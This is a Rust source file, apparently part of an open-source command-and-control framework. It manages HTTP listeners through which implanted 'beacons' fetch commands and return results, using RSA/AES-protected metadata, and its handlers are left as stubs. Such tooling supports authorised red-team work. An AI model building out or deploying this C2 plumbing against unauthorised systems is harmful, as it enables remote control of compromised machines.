// Copyright (c) 2024 ThottySploity

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

pub mod metadata;
pub mod utils;

use crate::webserver::{QUEUE, LISTENERS};
use crate::webserver::endpoints::listeners::utils::ListenerUtils;
use crate::webserver::endpoints::listeners::metadata::MetaData;

use actix_web::{web, rt, HttpServer, App, Responder, HttpRequest, HttpResponse};
use rsa::RsaPrivateKey;

use anyhow::{anyhow, Result};
use log::{debug, info};

pub struct Listeners;

impl Listeners {
    
    pub async fn handle_listener_get() -> Result<String> {
        // Returns all the Active listeners

        if let Ok(listeners) = LISTENERS.lock() {
            let mut all_listeners: Vec<(usize, String, String, String)> = Vec::new();

            for (index, (listener_type, host, port, _)) in listeners.listeners.clone().iter().enumerate() {
                all_listeners.push((index, listener_type.to_string(), host.to_string(), port.to_string()));
            }

            return Ok(serde_json::to_string(&all_listeners)?);
        }

        Err(anyhow!("Listener does not exist"))
    }

    pub async fn handle_listener_remove(info: String) -> bool {
        // Returns if a listener has been removed

        let msg: Vec<&str> = info.split(":").collect();

        if msg.len() >= 4 {
            let listener_type = msg[1].to_string();
            let listener_host = msg[2].to_string();
            let listener_port = msg[3].to_string(); 

            if ListenerUtils::check_listener_in_queue(listener_type.clone(), listener_host.clone(), listener_port.clone()) {
                // Removing the server from the global variable
                // This will also stop the running server
                return ListenerUtils::remove_listener_from_queue(listener_type.clone(), listener_host.clone(), listener_port.clone()).await;
            }
        }

        false
    }

    pub async fn handle_listener_start(info: String, private_key: RsaPrivateKey) -> Result<String> {
        // Adds and starts an active listener

        let msg: Vec<&str> = info.split(":").collect();

        if msg.len() >= 4 {
            let listener_type = msg[1].to_string();
            let listener_host = msg[2].to_string();
            let listener_port = msg[3].to_string(); 

            match listener_type.as_str() {
                "http" => {
                    if !ListenerUtils::check_listener_in_queue(listener_type.clone(), listener_host.clone(), listener_port.clone()) {
                        // Listener is not added yet
                        if let Ok(_) = start_http_listener(listener_host, listener_port, private_key).await {
                            return Ok(format!("Listener has started"));
                        }
                    }
                },
                _ => return Err(anyhow!("Listener type does not exist")),
            }

        }

        Err(anyhow!("Listener couldn't start"))
    }
}

async fn start_http_listener(host: String, port: String, private_key: RsaPrivateKey) -> std::io::Result<()> {
    // Starting a new listener given a host and port
    // This can be used to start a listener on a different interface that's on the server

    info!("Starting HTTP Listener on: {}:{}", host, port);
    
    let listener = HttpServer::new(move || {
        App::new()
            // With the introduction of Profiles these /search/ paths will be changable.
            .app_data(web::Data::new(private_key.clone()))

            .route("/search/{variable}", web::post().to(http_listener_handler))  // Used for Beacon to post information
            .route("/search/{variable}", web::get().to(http_listener_handler))   // Used by beacons to communicate metadata 
    })
    .bind(&format!("{}:{}", host, port))?
    .run();
    
    let listener_handle = listener.handle();

    // Add the listener to a global variable so we can check cross threads
    ListenerUtils::add_listener_to_queue("http".to_string(), host, port, listener_handle);
    rt::spawn(listener);
    Ok(())
}

async fn http_listener_handler(req: HttpRequest, info: web::Path<String>, private_key: web::Data<RsaPrivateKey>) -> HttpResponse {
    // The main logic for the HTTP communications with the beacon goes here.
    // This server will listen for incoming connections and dispatch commands when received from mgmt

    if let Ok(beacon) = MetaData::decode(private_key.get_ref().clone(), info.to_string()) {
        let aes_key = beacon.key();

        match req.method().as_str() {
            // GET method for retrieving commands
            "GET" => {
                if let Ok(mut queue) = QUEUE.lock() {
                    debug!("Beacon: {} asking for a command", beacon.id());
                    
                }
            },
            // POST method for posting results of commands
            "POST" => {

            },
            _ => return HttpResponse::NotFound().into(),
        };
    }
    HttpResponse::NotFound().into()
}